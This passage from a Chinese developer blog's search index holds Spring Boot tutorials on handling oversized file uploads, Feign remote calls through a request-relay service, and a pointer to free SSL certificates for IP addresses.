class="token annotation punctuation">@ResponseBody</span>  RestResult <span class="token function">handlerBusinessException</span><span class="token punctuation">(</span>MaxUploadSizeExceededException ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    String msg <span class="token operator">=</span> <span class="token string">"上传文件失败"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ex<span class="token punctuation">.</span><span class="token function">getCause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCause</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">FileSizeLimitExceededException</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      msg <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"上传文件过大[单文件大小不得超过%sMB]"</span><span class="token punctuation">,</span> multipartProperties<span class="token punctuation">.</span><span class="token function">getMaxFileSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toMegabytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ex<span class="token punctuation">.</span><span class="token function">getCause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCause</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">SizeLimitExceededException</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      msg <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"上传文件过大[上传总文件大小不得超过%sMB]"</span><span class="token punctuation">,</span> multipartProperties<span class="token punctuation">.</span><span class="token function">getMaxRequestSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toMegabytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> RestResult<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>其中RestResult是笔者封装的统一返回工具, 异常进行web结果返回即可</p><h2 id="存在的坑"><a href="#存在的坑" class="headerlink" title="存在的坑"></a>存在的坑</h2><p>如果Spring Boot集成Tomcat启动, 可能会出现无法捕获到异常的情况</p><p>原因是Tomcat中存在MaxSwallowSize配置</p><p>如果它的值小于配置文件中multipart设置的值, tomcat会先于Spring Boot进行异常捕获, 导致Spring Boot的全局异常捕获失效</p><p>解决的方式也很容易, 增加Tomcat相关配置即可:</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>    <span class="token key atrule">tomcat</span><span class="token punctuation">:</span>        <span class="token key atrule">max-swallow-size</span><span class="token punctuation">:</span> <span class="token number">-1</span></code></pre><p>-1代表不限制大小</p><hr><p>作者：Houtaroy<br>链接：<a href="https://juejin.cn/post/6991993471930204190">https://juejin.cn/post/6991993471930204190</a></p>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Feign远程调用</title>
      <link href="/2023/01/13/feign-yuan-cheng-diao-yong/"/>
      <url>/2023/01/13/feign-yuan-cheng-diao-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="Feign远程调用"><a href="#Feign远程调用" class="headerlink" title="Feign远程调用"></a>Feign远程调用</h1><h2 id="中转调用示例"><a href="#中转调用示例" class="headerlink" title="中转调用示例"></a>中转调用示例</h2><h3 id="中转模块"><a href="#中转模块" class="headerlink" title="中转模块"></a>中转模块</h3><ul><li>Controller</li></ul><pre class=" language-java"><code class="language-java">    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/getHttpUtilPost"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> <span class="token function">getHttpUtilPost</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> req<span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"网络请求中转,请求了/getHttpUtilPost,参数：{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultData<span class="token operator">&lt;</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> httpUtilPost <span class="token operator">=</span> service<span class="token punctuation">.</span><span class="token function">getHttpUtilPost</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>httpUtilPost<span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"请求结果：{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>httpUtilPost<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"请求成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/getHttpUtilGet"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> <span class="token function">getHttpUtilGet</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> req<span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"网络请求中转,请求了/getHttpUtilGet,参数：{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultData<span class="token operator">&lt;</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> resultData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultData</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> httpUtilGet <span class="token operator">=</span> service<span class="token punctuation">.</span><span class="token function">getHttpUtilGet</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span>httpUtilGet<span class="token punctuation">)</span><span class="token punctuation">;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"请求结果：{}"</span><span class="token punctuation">,</span> JSONObject<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>httpUtilGet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>        resultData<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"请求成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> resultData<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><ul><li>Service</li></ul><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">></span> <span class="token function">getHttpUtilPost</span><span class="token punctuation">(</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> req<span class="token punctuation">)</span><span class="token punctuation">{</span>        HttpResponse response <span class="token operator">=</span> HttpUtil<span class="token punctuation">.</span><span class="token function">createPost</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>req<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>req<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>req<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ContentType<span class="token punctuation">.</span>JSON<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"status"</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">></span> <span class="token function">getHttpUtilGet</span><span class="token punctuation">(</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> req<span class="token punctuation">)</span><span class="token punctuation">{</span>        StringBuilder url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> req<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Set<span class="token operator">&lt;</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> entries <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> next <span class="token operator">:</span> entries<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String key <span class="token operator">=</span> next<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String value <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>next<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span> <span class="token operator">||</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            url<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        HttpResponse response <span class="token operator">=</span> HttpUtil<span class="token punctuation">.</span><span class="token function">createGet</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>req<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"status"</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span><span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="其他模块请求中转模块"><a href="#其他模块请求中转模块" class="headerlink" title="其他模块请求中转模块"></a>其他模块请求中转模块</h3><ul><li>定义Feign接口</li></ul><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@FeignClient</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"qzbdt-client-network"</span><span class="token punctuation">,</span> url <span class="token operator">=</span> <span class="token string">"${domain.Internet.path}"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">FeignEnt</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/network/getHttpUtilPost"</span><span class="token punctuation">)</span>    ResultData<span class="token operator">&lt;</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">>></span> <span class="token function">getHttpUtilPost</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/network/getHttpUtilGet"</span><span class="token punctuation">)</span>    ResultData<span class="token operator">&lt;</span>HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">>></span> <span class="token function">getHttpUtilGet</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>实现接口</li></ul><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FeignRequest</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> FeignEnt feignEnt<span class="token punctuation">;</span>    <span class="token keyword">public</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> <span class="token function">getHttpUtilPost</span><span class="token punctuation">(</span>String url<span class="token punctuation">,</span> String body<span class="token punctuation">,</span> String authorization<span class="token punctuation">)</span> <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>        params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">,</span> authorization<span class="token punctuation">)</span><span class="token punctuation">;</span>        params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">,</span> body<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> feignEnt<span class="token punctuation">.</span><span class="token function">getHttpUtilPost</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> <span class="token function">getHttpUtilGet</span><span class="token punctuation">(</span>String url<span class="token punctuation">,</span> String body<span class="token punctuation">,</span> String authorization<span class="token punctuation">)</span> <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>        params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">,</span> authorization<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> feignEnt<span class="token punctuation">.</span><span class="token function">getHttpUtilGet</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="其他服务调用示例"><a href="#其他服务调用示例" class="headerlink" title="其他服务调用示例"></a>其他服务调用示例</h2><ul><li>定义Feign接口</li></ul><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 调用评价服务接口 */</span><span class="token annotation punctuation">@FeignClient</span><span class="token punctuation">(</span><span class="token string">"psds-eval"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">EvalFeign</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/customerScreenController/feign/getCustomerScreenList"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">getCustomerScreenList</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">></span> param<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestHeader</span> String Authorization<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/customerScreenController/getEntRuleByBatch"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> String <span class="token function">getEntRuleByBatch</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String batchId<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span> String entUid<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestHeader</span> String Authorization<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>Controller具体使用</li></ul><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//依赖注入 </span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> EvalFeign evalFeign<span class="token punctuation">;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/entGroup/eval/detail"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"评价指标详情"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> ResultData<span class="token operator">&lt;</span>BaseResp<span class="token operator">&lt;</span>GroupEntLvlHistory<span class="token operator">>></span> <span class="token function">groupEvalDetail</span><span class="token punctuation">(</span>HttpServletRequest request <span class="token punctuation">,</span><span class="token annotation punctuation">@RequestBody</span> EntGroupEvalReq req<span class="token punctuation">)</span><span class="token punctuation">{</span>        String authorization <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>Object<span class="token operator">></span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"indexGroup"</span><span class="token punctuation">,</span>req<span class="token punctuation">.</span><span class="token function">getIndexGroup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"batch"</span><span class="token punctuation">,</span>req<span class="token punctuation">.</span><span class="token function">getBatch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"pageNo"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            params<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"pageSize"</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String customerScreenList <span class="token operator">=</span> evalFeign<span class="token punctuation">.</span><span class="token function">getCustomerScreenList</span><span class="token punctuation">(</span>params<span class="token punctuation">,</span>authorization<span class="token punctuation">)</span><span class="token punctuation">;</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> result <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>customerScreenList<span class="token punctuation">,</span> Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            List<span class="token operator">&lt;</span>Map<span class="token operator">></span> list <span class="token operator">=</span> JSONArray<span class="token punctuation">.</span><span class="token function">parseArray</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"list"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            List<span class="token operator">&lt;</span>Map<span class="token operator">></span> filterList <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>map <span class="token operator">-</span><span class="token operator">></span> StringUtils<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"ent_social_no"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span><span class="token function">getEntCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Map map <span class="token operator">=</span> null<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>filterList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                map <span class="token operator">=</span> filterList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> ResultData<span class="token punctuation">.</span><span class="token function">resp</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> ResultData<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> 远程调用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Feign </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费为ip添加ssl证书</title>
      <link href="/2023/01/07/mian-fei-wei-ip-tian-jia-ssl-zheng-shu/"/>
      <url>/2023/01/07/mian-fei-wei-ip-tian-jia-ssl-zheng-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="免费为ip添加ssl证书"><a href="#免费为ip添加ssl证书" class="headerlink" title="免费为ip添加ssl证书"></a>免费为ip添加ssl证书</h1><p>找了个能给ip免费颁发ssl证书，<a href="https://zerossl.com/">https://zerossl.com</a> 正经证书。</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssl证书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>策略模式和工厂模式的应用</title>
      <link href="/2023/01/06/ce-lue-mo-shi-he-gong-han-mo-shi-de-ying-yong/"/>
      <url>/2023/01/06/ce-lue-mo-shi-he-gong-han-mo-shi-de-ying-yong/</url>
      
